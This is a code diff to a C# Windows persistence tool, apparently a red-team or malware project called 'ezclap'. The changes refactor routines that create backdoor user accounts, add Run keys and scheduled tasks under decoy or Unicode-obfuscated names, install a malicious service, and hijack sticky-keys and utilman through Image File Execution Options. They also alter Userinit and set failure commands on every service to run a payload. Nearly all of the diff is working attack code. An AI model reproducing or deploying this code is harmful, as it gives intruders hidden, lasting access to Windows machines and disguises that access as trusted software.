@@ -24,7 +24,7 @@ namespace ezclap
         {
             foreach (string service in services)
             {
-                string argument = "/C sc failure " + service + " reset= 10 actions= run/5000 command= \"" + payload + "\"";
+                string argument = "/C sc failure " + service + " reset= 10 actions= run/5000//// command= \"" + payload + "\" ";
                 System.Diagnostics.Process.Start(@"C:\Windows\System32\cmd.exe", argument);
             }
         }
@@ -62,16 +62,6 @@ namespace ezclap
             */
         }
 
-        public static void modifyAccessbility()
-        {
-            string[] accessibility = new string[] { "sethc.exe", "utilman.exe", "Magnify.exe", "Narrator.exe" };
-            foreach (string binary in accessibility)
-            {
-                string finalLoc = RegistryKeys.hklmImageFileExec + "\\" + binary;
-                Utils.setHKLMSubKey(finalLoc, "Debugger", "C:\\Windows\\System32\\cmd.exe");
-            }
-        }
-
         static void Main(string[] args)
         {
 
@@ -100,54 +90,51 @@ namespace ezclap
             // 0. Dropping payload, changing it to random names, timestomping, etc...
 
             // 1. Create Backdoor users 
-            AddUser persist_adduser = new AddUser(users, password, groups);
+            AddUser persistAddUser = new AddUser(users, password, groups);
 
             
             // 2. Create Runkey registry with payloads 
-            string[] names = new string[] { "Application Security", "Backup", "Appsec", "Google Updates", "Microsoft_Credential_Guard", "duderino", "catchmeifyoucan" };
-            AddRunKey persist_addrunkey = new AddRunKey(names, payload);
+            string[] names = new string[] { "ApplicationSecurity", "Backup", "Appsec", "Google Updates", "Microsoft_Credential_Guard", "duderino", "catchmeifyoucan" };
+            AddRunKey persistAddRunKey = new AddRunKey(names, payload);
             
             
             // 3. Create a malicious service --> Through sc? Or actually through installer route? 
-            //string unicodeServiceName = "樂𐐷𐐷𐐷𐐷𐐷𐐷쀍승관𤭢𤭢𤭢𤭢𤭢𤭢𤭢𤭢𤭢𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𤭢𤭢𤭢𤭢𤭢𤭢𤭢樂쳌쳌쳌쳌쀍";
             string easyServiceName = "ApplicationSecurity";
-            //AddService uniService =  new AddService(unicodeServiceName, payload);
             AddService easyService = new AddService(easyServiceName, payload);
-            //uniService.StartService(unicodeServiceName, 10000);
             easyService.StartService(easyServiceName, 10000);
 
             
             // 4. Create scheduled task - Runs every 20 minutes 
             string scheduledTaskName = "GoogleUpdateTaskMachineMaster";
             string unicodeScheduledTaskName = "樂𐐷𐐷𐐷𐐷𐐷𐐷쀍승관𤭢𤭢𤭢𤭢𤭢𤭢𤭢𤭢𤭢𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𤭢𤭢𤭢𤭢𤭢𤭢𤭢樂쳌쳌쳌쳌쀍";
-            
             AddScheduledTask task1 = new AddScheduledTask(scheduledTaskName, payload, 20.0);
             AddScheduledTask task2 = new AddScheduledTask(unicodeScheduledTaskName, payload, 20.0);
-            /*
+
             // 5. Create startup folder persistence 
 
             // 6. Create utilman and sceth (sticky) persistence 
-            modifyAccessbility();
+            string accessbilityPayload = "C:\\Windows\\System32\\cmd.exe";
+            AddAccessibility persistAccess = new AddAccessibility(accessbilityPayload);
 
+            
             // 7. Modify userinit 
-            setHKLMSubKey(RegistryKeys.hklmUserInit, "Userinit", payload + ", C:\\Windows\\System32\\userinit.exe");
+            Utils.setHKLMSubKey(RegistryKeys.hklmUserInit, "Userinit", payload + ", C:\\Windows\\System32\\userinit.exe");
 
-            // 8. Modify Fax - Windows client only 
-            modifyFaxService(payload);
+            /*
 
-            // 9. Modify ImagePath 
+            // 8. Modify ImagePath - TODO: Implement this 
             setHKLMSubKey(RegistryKeys.hklmImagePath, "ImagePath", payload);
-            
-            // 10. Modify FailureCommand 
+            */
+
+            // 9. Modify FailureCommand 
             List<string> servicesList = new List<string>();
-            servicesList = getAllServices();
-            modifyFailureService(servicesList, payload);
+            servicesList = Utils.getAllServices();
+            AddFailureCommand persistFailureCommand = new AddFailureCommand(servicesList, payload);
             
-            // 11. Modify Image File Execution             
+            // 10. Modify Image File Execution             
             //modifyImageFileExec(payload);
 
-            modifyAccessbility();
-            */
+            
 
             Console.ReadLine();
         }
